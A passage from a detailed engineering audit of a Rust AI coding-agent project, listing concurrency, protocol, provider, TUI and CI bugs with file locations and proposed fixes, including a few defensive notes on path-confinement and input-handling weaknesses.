**Fix:** `return entries;`; seed `truly_new` with all indices and remove only explicitly-scored-below-threshold ids.

#### H-E13 · Auto-check runs against the engine root, not the transcript's working dir

`engine.rs:25127, 25161`: `CheckTool::run_check(&self.working_dir, 60)` ignores the carefully resolved `per_transcript_wd` — a swarm agent writing in its worktree gets diagnostics (and baseline overwrites) from the main repo. The written-file read also uses `unwrap_or_default()` (`25169`), feeding empty content to LSP diagnostics on read failure.
**Fix:** Use `tool_context.working_dir`; key baselines per working dir; skip diagnostics for unreadable files instead of fabricating content.

---

### 3.4 Concurrency, protocol & resource safety

#### H-R1 · ACP: approval-batch parse failure silently drops every approval → 120s hang then auto-deny

`kod-core/src/acp.rs:470`: `serde_json::from_str(json_str).unwrap_or_default()` — on parse failure the batch is empty, no `respond_to_approval` is sent, pending approvals ride out `AWAIT_APPROVAL_SECS`, then everything is denied. No error surfaced to either side. The TUI has the identical failure shape (`main_loop.rs:1198–1214`).
**Fix:** On parse error, log at `error`, respond explicit `Deny` per item (fail-closed but immediate), and emit a user-visible error event; never silently default.

#### H-R2 · ACP: the 120s bound doesn't cover the outbound send; EOF neither cancels in-flight turns nor aborts tasks

`acp.rs:135–150, 196–275`: `request()`'s timeout wraps only the response wait — the preceding `out.send(...).await` (bounded channel → writer task → stdout pipe) is unbounded: a client that stops reading stdout wedges `request`/`notify`/`respond` forever — the exact wedge the timeout was meant to prevent. On stdin EOF, `serve()` awaits the writer task while mid-turn `session/prompt`s keep running the full agentic loop (up to 40 rounds) and permission requests wait 120s against a gone client; dispatch tasks are detached spawns, never tracked or aborted.
**Fix:** Wrap the send in the same timeout (or `try_send` with bounded retry); keep JoinHandles / a `CancellationToken` per connection; on EOF signal cancel for live sessions and await tasks with a bounded grace period.

#### H-R3 · ACP: no per-session serialization of `session/prompt`; stop-reason inferred by substring

`acp.rs:343–361`: a second concurrent prompt for the same session is neither rejected nor queued — two turns interleave history writes, approval state, and tool attribution. `acp.rs:451–458`: stop reason is `if msg.contains("cancelled") {"cancelled"} else {"refusal"}` — any engine/provider failure (auth, network, 500) is reported as *model refusal* per ACP semantics.
**Fix:** In-flight session guard (reject with `-32002 "session busy"` or queue); typed `KodError::Cancelled` variant mapped properly; other errors → JSON-RPC error response, reserve `refusal` for real refusals.

#### H-R4 · serve daemon: no request-line cap, `process` blocks the read loop, unbounded spawns, disconnect doesn't cancel

`kod-core/src/serve.rs:336,358,372,550`: (1) `next_line()` buffers arbitrarily — a same-UID client can OOM the daemon with one giant non-newline blob; (2) `process`/`list_models` execute inline in the read loop, so while a non-streaming prompt is in flight, `cancel`/`steer`/`respond_to_approval` frames on the same connection are not read (the documented approval flow works only for the streaming method); (3) every `process_streaming`/`swarm` spawns a task holding an engine Arc with no concurrency cap; (4) on client disconnect the engine task is detached — a swarm keeps executing file writes with no consumer; daemon shutdown doesn't drain in-flight streams.
**Fix:** Bounded line reads (1–2 MiB cap, kill connection on overflow); spawn `process` like the streaming path; semaphore-cap concurrent pumps; abort/cancel engine work when the writer dies; drain on shutdown.

#### H-R5 · Swarm hub leaks agents and unbounded inboxes across runs — teardown never exercised

`kod-swarm/src/communication.rs:54021–54069` + engine: the engine owns one long-lived hub; `swarm.shutdown()`, `remove_agent`, `unregister_agent`, and `hub.clear_all()` have **zero production callers** (the engine comment claiming the runner calls `clear_all()` is false). Every run leaves agents registered with unbounded mpsc inboxes and 100-message histories; in a long-lived daemon, agent count and queued messages (full result strings) grow without bound. Nothing ever drains the inboxes (`get_agent_receiver` is test-only).
**Fix:** Call `swarm.shutdown()`/`clear_all()` at the end of `run()` including error paths; bounded inboxes with drop-oldest, or skip enqueueing when no receiver has been taken; add an invariant test (registration count returns to zero after a run).

#### H-R6 · Swarm: hardcoded 90s watchdog cancels healthy agents mid-tool; wave timeouts drop futures mid-tool

`swarm_runner.rs:659,994,1012`: the heartbeat watchdog cancels any `Running` agent with no chunk for 90s — long silent tools (cargo build/test, slow local models) get cooperatively cancelled, work discarded, and the retry loop re-runs them (livelock until retry budget dies); the threshold ignores the configurable `agent_timeout_secs` and events carry bogus `attempt: 0, max_attempts: 0`. Under the global deadline, `timeout(remaining, join_all(waves))` drops async blocks at await points — in-loop cleanup never runs (transcript + cancel-flag leak), a tool mid-write aborts non-atomically, and timed-out agents' results vanish from the merge input.
**Fix:** Make the idle threshold configurable (or derive from `agent_timeout_secs`/4); suppress watchdog during known tool execution (engine heartbeat on tool start/done); spawn waves as tasks with `AbortHandle` + explicit post-abort cleanup; track partial completions in `raw`.

#### H-R7 · LSP client: `initialize` has no timeout; documents opened with empty text; settle heuristic returns false-clean

`kod-lsp/src/client.rs:140–150, 365–371, 231–245`:
- The initialize handshake loop has no deadline anywhere (every other path is bounded at 30s) — a spawned-but-stalled server hangs the tool call indefinitely.
- `ensure_open` didOpens with `""`; per LSP spec the server then treats the client-provided text as truth — hover/definition/references at line 42 of a document the server believes is empty return null/garbage. The comment's justification is spec-incorrect.
- The settle heuristic breaks 800ms after the last publish *for the file*; on a cold index (rust-analyzer publishes empty first, real diagnostics later) `diagnostics()` returns empty → the agent's write-gating interprets "server still indexing" as "code clean". For an agent that gates writes on this, a false clean is a correctness hazard.
**Fix:** Timeout the init loop (30–60s); didOpen with real disk content (callers already have it); require quiescence over *any* incoming message or N consecutive publishes, or wait for `$/progress` end; make the settle window configurable.

#### H-R8 · LSP/MCP: URI encoding missing → silently empty diagnostics; server-initiated requests never answered; pagination ignored

- `kod-lsp/src/client.rs:515–541`: `path_to_uri` does no percent-encoding; servers echo normalized URIs (`/tmp/my project` → `/tmp/my%20project`), exact-string matching never matches → **silently empty diagnostics for any path needing encoding** (spaces are common on macOS/Windows). `uri_to_path` symmetrically never decodes.
- `kod-mcp/src/client.rs:319–345`: any message with an `id` goes to the pending map; server→client *requests* (`ping`, `roots/list`, `sampling/create`) are logged as "response for unknown request" and dropped — JSON-RPC requires a reply; a server waiting on `roots/list` wedges.
- `kod-mcp/src/client.rs:180–198`: `tools/list` ignores `nextCursor` — on large catalogs tools are silently missing.
**Fix:** Percent-encode/decode (the `url` or `percent-encoding` crate); distinguish request (id+method) from response and answer unknown requests with `-32601`; follow pagination cursors.

#### H-R9 · LSP/MCP manager spawn/insert race vs shutdown; dead servers never reaped; every failure swallowed to "empty"

- `kod-lsp/src/manager.rs:113–135, 223–235` (and the identical pattern in kod-core `McpHost::ensure_started`): `client_for` drops the lock, spawns+initializes, re-locks and inserts; `shutdown_all` drains the map — a client_for that passed the empty-check before the drain inserts *after* it, so a server outlives engine shutdown. The docs claim the race can't happen. Racing callers also both spawn and one is discarded (double rust-analyzer indexing).
- Dead servers are never detected or restarted: writes go to dead stdin, EOF returns "whatever was collected — usually none" → server death is indistinguishable from clean code. `McpHost::ensure_started` returns the cached client unconditionally; a dead server stays a corpse until restart (the doc claims "the next call re-spawns" — nothing does).
**Fix:** Generation/epoch counter or `OnceCell`-per-binary keyed under a short-lived outer lock; health flag (`AtomicBool` set false on EOF/write failure), evict-and-respawn on next call; expose `is_alive()` for MCP hosts.

#### H-R10 · Tool registry: read lock held across the entire tool `execute` await

`kod-tools/src/registry.rs:124–131`: MCP hot-reload `register()` (write lock) blocks until the current tool call finishes — a 120s `check` stalls re-registration; any tool that registers mid-execution self-deadlocks (tokio RwLock is fair). Also `get_definitions_for_llm` iterates the HashMap unsorted — the LLM's tool list order changes between restarts (prompt instability; the other getter sorts).
**Fix:** Clone `Arc<dyn Tool>` out before awaiting; sort definitions.

#### H-R11 · `patch_file` acquires the path lock only for the write — read+diff happen before it (lost update)

`kod-tools/src/tools.rs:919–960`: two concurrent `patch_file` calls both diff against the same original; the second write silently reverts the first. `write_file` by contrast holds the lock across the whole body. The lock table exists precisely to prevent this.
**Fix:** Acquire first, then read → apply → write under the same guard; optionally re-verify mtime/size.

#### H-R12 · `check`/`git` timeouts drop the future but not the child; output buffered unbounded before capping

`kod-tools/src/check.rs:413–431, git.rs:44–68`: `timeout(dur, cmd.output())` abandons the child (no `kill_on_drop`) — a stuck `cargo check` keeps burning CPU/holding the target-dir lock long after the tool "failed"; output is fully buffered before `truncate` caps the *result*, not the memory. The worktree git wrapper's doc claims "we do enforce a hard cap by killing the child" — it doesn't.
**Fix:** Spawn manually with `kill_on_drop(true)`, explicit `start_kill()` on expiry (tools.rs already does this correctly — reuse the pattern); stream-cap the pipes.

#### H-R13 · `write_file`/`patch_file` are not atomic; `fs4` declared and never used

`kod-tools/src/tools.rs:376,960`: `std::fs::write` truncates in place — a crash/ENOSPC mid-write leaves a torn file that the engine then feeds back to the model.
**Fix:** Temp file in the same directory + `write_all` + `sync_all` + `rename` (same-dir rename is atomic).

#### H-R14 · Diff application: header lines inside hunks vanish; no already-applied detection; CRLF unpatchable; new-side counts unvalidated

`kod-tools/src/patch.rs` (four findings):
- `:146–148` — `--- `/`+++ ` lines are skipped *anywhere* in the patch, including inside hunk bodies: removing a file line that starts with `--- ` (markdown rules, YAML) makes the line vanish → "consumed N of M" errors or shifted splices. GNU patch honors headers only before the first hunk.
- `:39–139` — no "already applied" detection: a pure-add hunk re-applies cleanly (duplicated lines) after a crash between result and checkpoint; no fuzz either, so one earlier edit turns every later hunk into a hard error.
- `:131` — hunk offset advances from header counts; the new-side count is never validated, so one miscounted header desynchronizes every following hunk.
- `:46–50` — lines split on `\n`, context compared without `\r` handling: CRLF files are unpatchable (Windows tools / `core.autocrlf` hit this immediately). Also `@@ -0,0` (new-file) headers wrap `usize`.
**Fix:** Honor headers only while outside hunks; pre-check post-state for "already applied" + optional ±2 fuzz with a `fuzz` field; validate actual new-side counts; detect CRLF, compare `\r`-stripped, re-emit the file's dominant EOL; special-case `old_start == 0`.

#### H-R15 · `FuturesExecutor` fallback aside — blocking walks on the async runtime (repomap/router)

`kod-core/src/router.rs:1333,1355` + `repomap.rs:91`: `fingerprint_of` (walk+stat) runs on **every prompt** and `build_repo_map` (full walk + `read_to_string` of every source file) on any change — all synchronous `std::fs` inside async prompt building, stalling the runtime thread. During active coding the map changes nearly every turn, so the cacheable system prefix is rebuilt and provider prefix caches thrash exactly when hits matter. Also `repomap.rs:337` recompiles regexes per file per walk (~30k compiles per rebuild on a 10k-file repo), and `fingerprint_of` uses `max_depth(3)` while `build_repo_map` walks the full tree — **edits below depth 3 never invalidate the map** (permanently stale for monorepos), and mtime granularity is 1s.
**Fix:** `spawn_blocking` both walks; `OnceLock<Vec<Regex>>` per language (like `extract_rust` already does); use the same walk config for fingerprint and map (or fingerprint directory mtimes recursively); hash sub-second mtime.

#### H-R16 · Hooks aside — per-path lock claim, glob fail-open, and remaining tools hardening

Condensed from `kod-tools`:
- `context.rs:798–814`: invalid glob → `return false` — for `forbidden_paths` a typo'd glob silently disables the protection; a fresh GlobSet is rebuilt per path check.
- `tools.rs:500–507`: command output caps are good, but the timeout kill is SIGKILL with no grace period; grandchildren survive.
- `context.rs:585–653`: confinement is check-then-use — a symlink swapped between `resolve_path` and `open` escapes the root (no `openat2(RESOLVE_BENEATH)`/`O_NOFOLLOW`).
**Fix:** Validate globs at context construction (fail-closed for forbidden lists), cache compiled GlobSets; SIGTERM→grace→SIGKILL; `openat2` on Linux where available.

---

### 3.5 Providers (LLM wire layer)

#### H-P1 · OpenAI-compatible provider flattens native tool calls to text — the function-calling round-trip is broken

`kod-provider-openai/src/provider.rs:223–274, 358`: because adk-core 2.2 drops tool-role contents, assistant `tool_calls` become text (`"[tool_call id={id} name={name}] {args}"`) and tool results become user-role text. The model never sees native `tool_calls`/`role:"tool"` messages — OpenAI-spec function-calling continuation, parallel-call linking, and per-call result association all degrade to a text convention most models ignore. The non-stream path also discards `FunctionCall.id` (`id: None`), so even the text convention loses its link key.
**Fix:** Build the OpenAI chat-completions body locally, mirroring the Anthropic `wire.rs` approach (assistant `tool_calls[]` with `function.arguments`; `role:"tool"` + `tool_call_id` results; preserve ids end-to-end) — or upgrade/patch adk. This is the single biggest wire-correctness debt in the workspace.

#### H-P2 · Anthropic SSE decoder corrupts multi-byte characters split across TCP chunks

`kod-provider-anthropic/src/provider.rs:314`: each TCP chunk is decoded independently with `from_utf8_lossy` before line-splitting. A CJK/emoji character split across chunks becomes U+FFFD garbage in streamed text **and tool arguments** — practically guaranteed on long non-ASCII outputs.
**Fix:** Keep `buf: Vec<u8>`, append raw bytes, find `\n` on bytes, decode only complete lines, carry the partial tail. Also feed the remaining buffer after stream end (`:318–347` drops a trailing unterminated final frame — frequently the final usage event).

#### H-P3 · The good retry policy is dead code; three divergent classifiers shipped instead

`kod-provider/src/retry.rs` (jitter, delay cap, `Retry-After` via typed `RateLimited`, injectable sleep — production-grade) has **zero callers**. Meanwhile openai/provider.rs:300–327 reimplements an inline retry with substring `is_retryable` (`"try again"`, `"429"`, `"timeout"` — matches permanent 401/403 messages; worst case 3×300s ≈ 10 min hang), fixed backoff, no jitter (retry storms across swarm agents), no `Retry-After`; Anthropic has no retry at all; no streaming path retries anywhere; kod-error has yet another `is_retryable`.
**Fix:** Route all provider paths through `retry::with_retry`; classify retryability from typed HTTP status (kept in the error) rather than substring-matching Display strings; delete the duplicate classifiers.

#### H-P4 · Nightly-only `str::floor_char_boundary` in both providers [NEEDS-VERIFY: may have stabilized]

`kod-provider-anthropic/src/provider.rs:200`, `kod-provider-openai/src/provider.rs:402` use `floor_char_boundary` (tracking issue #93743); no polyfill exists in the workspace. If unstable on the pinned toolchain, the provider crates do not compile on stable at all.
**Fix:** Local char-boundary-safe helper (also fixes the irony that the char-safe truncation path is the one that may not compile, while `kod-error`'s `&body[..300]` panics at runtime — H-C1).

#### H-P5 · reqwest `stream` feature missing for `bytes_stream()` [NEEDS-VERIFY]

`kod-provider-anthropic/Cargo.toml:14` uses `resp.bytes_stream()` but adds no reqwest features; the workspace reqwest is `default-features = false, features = ["json","rustls"]`, and another crate explicitly adds `"stream"` for streaming — strong signal the gate is required.
**Fix:** `reqwest = { workspace = true, features = ["stream"] }` in kod-provider-anthropic (or verify 0.13 ungates it).

#### H-P6 · Mid-stream `error` events swallowed; `stop_reason` parsed nowhere; cache tokens excluded from usage

`kod-provider-anthropic/src/wire.rs:362–384` + `provider.rs:526`: an Anthropic `event: error` hits the `_` arm and vanishes; combined with the synthetic `Done` on transport close, a killed/overloaded stream is indistinguishable from a complete one. `stop_reason` (`max_tokens`, `refusal`, `pause_turn`) is parsed nowhere and `StreamChunk` has no StopReason variant — the engine can never learn a response was truncated mid tool-JSON. `prompt_tokens` counts only `input_tokens`, excluding `cache_read_input_tokens`/`cache_creation_input_tokens` — with caching enabled, prompt volume and cost are structurally under-counted (`TokenUsage`/`ModelPricing` have no cache fields).
**Fix:** Add an `error` arm yielding `Err`; add `StreamChunk::StopReason` populated from `message_delta`; extend `TokenUsage` with cache fields and `ModelPricing` with cache rates; answer `tool_result` blocks with `is_error` for failed tools (currently indistinguishable).

#### H-P7 · Anthropic 300s total request timeout kills long streams; config `timeout_secs` never applied

`provider.rs:45–51`: the shared client's `.timeout(300s)` covers the entire body read — any generation over 5 minutes is aborted mid-flight; there is no idle/read timeout either. `provider_setup.rs` passes `endpoint.timeout_secs` only to the OpenAI provider; Anthropic has no timeout parameter.
**Fix:** Per-request idle/read timeouts (no total cap on streams); `with_api_key_and_timeout` parity.

#### H-P8 · Capabilities matrix lies; `list_models` hardcoded empty

`kod-provider-openai/src/provider.rs:372–500` inherits `conservative()` (`streaming_tools: false`, `prompt_cache: None`) but the stream path *does* emit live text during tool calls and OpenAI-compat servers do prefix-cache; the TUI and router act on wrong data. Anthropic claims `vision: true` with no image path anywhere. Anthropic `list_models` returns `Ok(Vec::new())` by comment-choice — no model/context-window introspection anywhere (engine budgets against config guesses), and `ModelPricing` is never populated.
**Fix:** Override `capabilities()` truthfully per provider; wire the real `list_models` (or expose per-model `{context_window, max_output, pricing}` statics) and feed the budget layer.

#### H-P9 · Anthropic wire: merged user turn puts text before `tool_result` (spec violation, pinned by test); cache-breakpoint rule caches volatile content

`wire.rs:108–173`: when a user text message precedes a tool result, the converter emits `[text, tool_result]`; the API requires `tool_result` blocks first — the request is rejected exactly in the steering/note flows that produce it, and the unit test pins the wrong order. `wire.rs:72–90`: `rposition(|s| s.cacheable)` marks the last cacheable segment even when volatile segments sit before it — folding volatile text into the cached prefix (the exact failure the module doc calls "wrong"); only 1 of Anthropic's 4 allowed breakpoints is used and never on the message prefix — the biggest agentic cache win is unrealized.
**Fix:** Sort merged content tool_result-first (and fix the test); `debug_assert!` the cacheable-prefix invariant in `SystemPrompt`; add a second breakpoint on the last message of the previous turn.

#### H-P10 · Legacy stream contract violation: `Err` followed by `Usage` + `Done`

Both providers' legacy `stream` generators yield `Err(...)`, break, then *still* yield `Usage`/`Done` — violating the documented "error or clean Done" contract; consumer behavior depends on ignoring post-Err chunks. The trait-default `response_chunks` bridge also drops `usage` entirely.
**Fix:** `return` after the Err yield; emit `StreamChunk::Usage` in the bridge.

---

### 3.6 TUI

#### H-T1 · Full-frame render per event with no throttle; chat area double-renders the whole transcript per frame

`main_loop.rs:616–620` + `ui/chat.rs:319–505`: every keystroke, every streamed chunk, and every 100ms tick repaints the entire frame. Per frame the chat widget (1) renders *every* message at width−1 for the scrollbar probe including markdown, (2) renders again for real, (3) runs `Paragraph::line_count` up to three times on cloned line vectors. The markdown cache only helps finished messages — the streaming bubble's hash changes every chunk (guaranteed miss), and user/system/tool rows re-wrap uncached via a width-measure that allocates a `String` **per character**. Net: O(2×transcript) work per streamed token; long sessions get progressively laggy *during* generation.
**Fix:** Drain all ready events (non-blocking) then render once per loop iteration (coalesce chunks; dirty-flag + tick rendering); cache per-message wrapped-row counts (invalidate on width/theme/content); reuse the previous frame's probe; measure width via `unicode-width` without allocating.

#### H-T2 · Quadratic span collapse in the markdown hot path

`markdown.rs:701–717`: `wrap_spans`' re-collapse clones the accumulated `Cow` **per appended char** for same-style runs — a 5k-char paragraph costs ~12M char-copies per render; same pattern in `reflow_line` (chat.rs, currently dead code).
**Fix:** Track `(start, end)` ranges or build per-line `String`s first, then slice once per span.

#### H-T3 · Keys share one bounded channel with the stream flood; each event costs a full render

`event.rs:239` + main_loop pump: engine chunks and key events share `mpsc::channel(100)`; during a fast stream the buffer fills with chunks and Esc/Ctrl+C lag seconds behind. The priority queue exists but keys don't use it.
**Fix:** Route keys as priority events (or a separate select arm — the classic ratatui pattern); drain/coalesce chunk events before rendering.

#### H-T4 · Esc with completions open wipes the whole input draft

`main_loop.rs:4224`: insert-mode Esc with the popup open runs `set_input(String::new())` — everything typed is destroyed, contradicting the very next arm's comment ("Esc in insert ALWAYS just drops to normal — never cancels").
**Fix:** Only `reset_completion()`; never clear the input on Esc.

#### H-T5 · Tool-result fallback can overwrite non-tool messages (operator-precedence bug)

`app.rs:1503–1512`: the third fallback's role check only guards the first disjunct — `m.role == Tool && a || b` — so the second disjunct matches **any** message whose first line contains the tool base word; `rposition` picks the newest and replaces its content with tool output. The sibling `Running`-entry match uses loose `contains` and can complete the wrong overlapping tool name.
**Fix:** Parenthesize and gate both disjuncts on role; better, capture `MessageId` at `start_tool_execution` and match by id (three near-identical heuristic matchers already disagree — see Pattern S4).

#### H-T6 · Jev phase-change check blocks the UI loop after every turn; `/check`, `/map`, `/git-status`, `/doctor`, `/handoff` block for up to 120s

`main_loop.rs:770, 3404–3455, 2365, 3055, 2592–2637`: `block_in_place(block_on(engine.detect_phase_change_with_jev(...)))` is a network round-trip executed synchronously in the event handler — the UI freezes after every completed turn (the "cheap synchronous check" comment is false). `/check` awaits `run_check(120s)` inline; `/map` does an uncached full repo walk; `/git-status` uses sync `Command::output`; `/handoff` runs inline Jev extraction and its spawned task is never stored in `gen_task`, so it cannot be cancelled and a late `HandoffGenerated` wipes a *newer* session (clear_messages + clear_history). `/summarize` has the same detached-task race.
**Fix:** Spawn all of these with results delivered via events (the `/summarize` pattern); store handles in `gen_task`; tag handoff/summarize completions with a turn id and drop stale events.

#### H-T7 · Byte-slice panics on multibyte input (4 sites in main_loop + 1 in TUI attachment)

`main_loop.rs:1102, 1626, 2855, 2871`: `&body[..64 * 1024]`, `&d[..100]`, `&s[..300]`, `&rest[..80]` — a file/attachment whose boundary lands mid-UTF-8 panics the TUI (the panic hook restores the terminal — good — but the app dies and the in-flight turn is lost). Other sites in the same file do it correctly, so the fix pattern already exists in-tree.
**Fix:** Shared `floor_char_boundary`-style helper (see Pattern S1); add `#![deny(clippy::string_slice)]`.

#### H-T8 · `/regenerate` and `/delete` don't rewind the engine transcript; display and model diverge

`main_loop.rs:2025, 2043`: both call `app.drop_last_exchange()` (UI only) — nothing tells the engine, so the next prompt includes the "deleted" exchange; `/regenerate` generates *on top of* the old answer.
**Fix:** Add an engine `forget_last_turns(n)`-style API and call it before redispatching.

#### H-T9 · No bracketed paste — pasting multiline code submits the first line as a prompt

Verified: no `EnableBracketedPaste`/`Event::Paste` anywhere in kod-tui. Pasting multiline text delivers literal `Enter` key events — the first line is submitted mid-paste and the rest becomes stray prompts. For a coding agent whose canonical input is "paste code + instructions", this breaks a primary flow. Ctrl+V types `v` (`read_clipboard` is dead code); the copy tool list lacks `wl-copy` (Wayland hosts can never copy); `xclip` blocks the UI thread with no timeout (`clipboard.rs:15–27`).
**Fix:** Enable bracketed paste and route `Event::Paste` into a multiline-aware input insert; wire clipboard read; spawn clipboard writes with a timeout (or `arboard`); add `wl-copy`.

#### H-T10 · Approval dialog has no timeout awareness; quit during generation loses partial replies silently

`main_loop.rs:3854–3909, 1474–1493`: the engine auto-denies at 120s but the modal stays up indefinitely swallowing keys; a late second batch silently replaces the visible one; no countdown rendered. Confirming quit neither aborts `gen_task` nor calls `request_cancel` — the pre-completion state is saved and the partial reply is silently lost.
**Fix:** Record arrival time, render countdown, auto-clear on engine timeout, push a system message when a batch supersedes an open one; on confirm-quit run `cancel_generation()` first (sets Cancelled state, saves the partial), then quit.

#### H-T11 · CJK/wide chars undercounted → bubble frame overflows; light theme code blocks unreadable

`markdown.rs:742`: `char_width()` returns 1 for every non-control char — CJK occupies 2 cells, so rendered rows exceed the inner width and the `│` frame is pushed off-screen (`unicode-width` is already in the tree via ratatui; the comment even names it). `markdown.rs:454` hardcodes a near-black code-block background in all themes; the light theme's dark-gray foreground is unreadable.
**Fix:** Use `UnicodeWidthChar`; add `code_bg` to `Theme` with light/dark variants.

#### H-T12 · Terminal restore gaps on non-panic error paths; panic hook "restores" itself

`main_loop.rs:509–539, 599, 608–620`: if `EnterAlternateScreen` fails after `enable_raw_mode()` succeeded, `restore_terminal()` is never reached (stranded raw mode); inside `restore_terminal`, `show_cursor()` failure returns before leaving alt-screen; and the panic-hook restore path fetches `take_hook()` *while the custom closure is still installed*, re-installing the custom hook instead of the default.
**Fix:** Best-effort `disable_raw_mode()` in `init_terminal`'s error path; aggregate all three restore steps; save the original hook `Box` before installing the custom one.

---

### 3.7 CLI, CI & release pipeline

#### H-C1 · Byte-slice panic inside the error-classification path

`kod-error/src/error.rs:120`: `&body[..300]` on provider response bodies — byte 300 inside a multi-byte char panics in the code that runs when things are already going wrong. Same pattern at `kod-cli/commands.rs:1447, 3817`, `kod-tools/web.rs:207–212`.
**Fix:** One shared char-safe `truncate_chars` helper (a correct implementation already exists in commands.rs's `preview` — used by its own tests); replace all sites; lint with `clippy::string_slice`.

#### H-C2 · `kod run` swallows the engine result and always exits 0

`commands.rs:5698`: `let _ = engine.process_streaming(&input, &tx).await;` — any failure prints nothing and the process exits 0, breaking the documented `kod run … | tee` scripting contract.
**Fix:** Capture the result; return `Err`/exit 1 after the stream flushes, mirroring `run_prompt`.

#### H-C3 · Embedded `kod swarm -n N` silently ignores the requested agent count

`commands.rs:1860`: `let _n = agents.unwrap_or(config.swarm.max_agents);` — `--agents` is parsed and tested but discarded; `SwarmRunner::from_config` uses config only. The `--remote` path honors it; the two paths disagree. (Also the file's only production `unwrap()` sits on a dead `create_dir_all` line here.)
**Fix:** Pass the override into the runner; delete the dead line.

#### H-C4 · `kod skills new` generates malformed frontmatter (missing `indoc!`)

`commands.rs:3998`: the template literal carries the source's 9-space continuation indent; `triggers:` sits at 9 spaces with list items at 2 — the just-created skill fails `kod validate-skills`.
**Fix:** `indoc::indoc!` (or re-flow); add a round-trip test `parse(skills_new output)`.

#### H-C5 · Release signing is dead code; `live-anthropic` job can never run; `kache` wrapper is an untracked hard dependency

Three CI findings:
- `release.yml:112`: the signing step's `if: env.MINISIGN_SECRET_KEY != ''` references the step's **own** env block, which the `env` context in step `if` cannot see → always false → releases silently unsigned (upload glob for `.minisig` is explicitly non-erroring). Also `:153` redirects minisign stdin from a file whose *name* is the password (`< "${MINISIGN_PASSWORD:-/dev/null}"`) — password-protected keys can never sign.
- `ci.yml:311`: `if: ${{ secrets.ANTHROPIC_API_KEY != '' }}` at job level — `secrets` is not available in job-level conditionals; the live-Anthropic job is silently skipped forever (or the workflow fails to parse).
- `.cargo/config.toml:15`: `rustc-wrapper = "kache"` — no install step, docs, or recipe anywhere in the repo; every fresh contributor and every CI run as committed breaks before compiling a line.
**Fix:** Hoist the secret to workflow/job-level `env` or a prerequisite step output; `printf '%s' "$PW" | minisign -Sm`; document/bootstrap `kache` or drop it from the committed config.

#### H-C6 · CI hygiene: `-D warnings` applied to dependency compiles; tools compiled from source unpinned; no `--locked`; no concurrency group

`ci.yml`: workflow-level `RUSTFLAGS: "-D warnings"` also breaks CI on any warning inside deps and the `cargo install`ed audit/deny/tarpaulin/bloat tools (each recompiled from scratch, 10–20 min); test/clippy builds don't use `--locked` (lock drift caught only at release); no `concurrency:` cancel-in-progress; actions pinned by tag not SHA; tarpaulin is historically brittle on edition 2024.
**Fix:** Scope `-D warnings` to the lint job; use `taiki-e/install-action`; `--locked` everywhere; concurrency group; SHA-pin actions; prefer `cargo-llvm-cov`.

#### H-C7 · Toolchain truth: CONTRIBUTING says 1.75+, edition 2024 needs ≥1.85, nothing enforces MSRV

`CONTRIBUTING.md:8` vs workspace `edition = "2024"`; no `rust-version` in `[workspace.package]`; `rust-toolchain.toml` floats `channel = "stable"`; CI matrix is stable/beta only — a dependency bump can raise the real MSRV silently.
**Fix:** `rust-version = "1.85"` + pinned toolchain + MSRV CI job; correct CONTRIBUTING.

#### H-C8 · Blocking stdin reads inside async tasks; no Ctrl+C handling in interactive REPLs

`commands.rs:1179, 1463, 1561, 1600, 1643`: sync `io::stdin().read_line` inside async fns/spawned tasks — pins a worker thread per wait; deadlocks outright under a current-thread runtime (tests). `kod serve` installs a ctrl_c handler; the chat REPL and streaming prompt don't — an interrupt mid-tool kills the process with no engine shutdown, no MCP child cleanup, no session-log finalize (orphaned `execute_command` children).
**Fix:** `tokio::io::stdin()` or `spawn_blocking`; install a ctrl_c handler in REPLs that cancels the turn, drains approvals as Deny, and shuts the engine down.

#### H-C9 · Error paths skip `engine.shutdown()` in four commands

`commands.rs:2024, 2200, 4923` (`run_swarm`, `run_agent`, `run_prompt`): `?` returns before the shutdown call — MCP children, watchers, and the redb handle get abrupt process teardown (run_serve gets this right).
**Fix:** Inner async block + unconditional `engine.shutdown().await` afterwards (defer-guard style).

#### H-C10 · Byte-index slicing panics; Windows editor invocation broken; apply_plan.py arbitrary write

- `commands.rs:1447, 3817` (covered in H-C1).
- `commands.rs:5716, 6207`: `kod config edit`/`kod skills edit` launch `sh -c` — the shipped Windows builds can never edit; non-zero editor exit aborts instead of trying the next candidate.
- `apply_plan.py:38–41`: `Create:`/`Modify:` paths from model-shaped plan text are opened verbatim — absolute paths and `../` accepted, no workspace confinement, no dry-run, no backup, `Modify` is a full overwrite; nested triple-backticks truncate the write.
**Fix:** `cmd /C` on Windows + candidate fallback; in apply_plan.py resolve and reject paths outside a declared root, refuse overwrite without `--force`, honor `Modify` with a diff.

---

## 4. P2 — Medium severity (condensed)

~130 medium findings, grouped by area. Format: **location** — issue → fix.

### Engine & agent loop
| Location | Issue → Fix |
|---|---|
| `engine.rs:23049–23055` | Pending-question slot leaks when the consumer is gone (insert before send) → remove on send error |
| `engine.rs:17920–17931, 17427–17431` | `set_hooks`/`set_generation_defaults`/`set_session_recorder` use `try_write` and **silently no-op** on contention → blocking write + expect at startup |
| `engine.rs:24104–24105` | Malformed tool-call args degrade to a bare JSON string with no explicit signal; small models retry identically → deterministic `ToolResult::Error("malformed tool arguments: …; resend valid JSON")` without executing |
| `engine.rs:24138–24141` | Jev "Complete" early-termination can truncate mid-tool-call; each check is a synchronous round-trip every 5 chunks → suppress while partials are pending; timeout the check |
| `engine.rs:24062–24300` | No cancellation observation during streaming; closed consumer channel doesn't stop the loop (`let _ = chunk_tx.send`) → check `is_cancelled_for` in the stream loop; treat repeated send-Err as cancellation |
| `engine.rs:24062, 24194–24219` | Model text forwarded verbatim can spoof `\0kod-*` control markers (UI injection) → strip/escape NULs from model chunks (the `clean()` idiom already exists) |
| `engine.rs:24832–24843` | `DenyAlways` stores the raw model-supplied `path` — relative/absolute mismatch makes the rule never match → canonicalize before storing |
| `engine.rs:24985–25068` | Jev-path session-log writes use `let _ = rec.record(...)` (≈10 sites) vs warn-on-failure elsewhere → route through one warning helper |
| `engine.rs:22886–22892, 24164` | Transcript re-cloned per round and per chain attempt (O(rounds × size)) → `&[ChatMessage]`/`Cow`/`Arc` snapshot |
| `engine.rs:21695–21705` | `KodConfig::load_default()` called twice per write round for `settle_ms` → load once per engine (mtime-check cache) |
| `engine.rs:26168–26187` | `clear_history_for` == `forget_transcript` byte-identical; `22634–22636` routing keys built from `format!("{:?}")` → alias one; use `as_label()` |
| `kod-core/src/context.rs:35–52` + `kod-memory/context.rs:20–38` | `estimated_tokens` ignores `system_prompt`/`tools_available` (both rendered by `to_prompt`); byte-length undercounts CJK → include the fields; use chars |
